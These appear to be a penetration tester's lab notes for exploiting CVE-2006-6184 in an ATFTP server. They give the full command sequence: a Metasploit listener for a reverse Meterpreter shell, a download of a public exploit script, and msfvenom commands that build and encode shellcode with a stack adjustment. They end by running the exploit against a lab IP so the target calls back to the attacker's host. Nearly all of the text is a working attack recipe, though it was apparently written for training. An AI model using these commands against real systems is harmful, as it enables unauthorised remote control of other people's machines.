# start listener
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_nonx_tcp
set ExitOnSession false
set AutoRunScript post/windows/manage/migrate
exploit -j

# prepare exploit
wget https://raw.githubusercontent.com/shauntdergrigorian/cve-2006-6184/master/atftp.py
perl -e 'print "\x81\xec\xac\x0d\x00\x00"' > stackadj
msfvenom -p windows/meterpreter/reverse_nonx_tcp lhost=<lhost> lport=<lport> R > payload
cat stackadj payload > shellcode
msfvenom -p generic/custom PAYLOADFILE=./shellcode -b "\x00" -e x86/shikata_ga_nai -f python

# insert output into payload
vim atftp.py
# insert
buf = ...
...
payload = buf

# run exploit (sometimes multple times)
python atftp.py 10.11.1.226 21 192.168.119.130 9

# References
https://www.exploit-db.com/exploits/2887

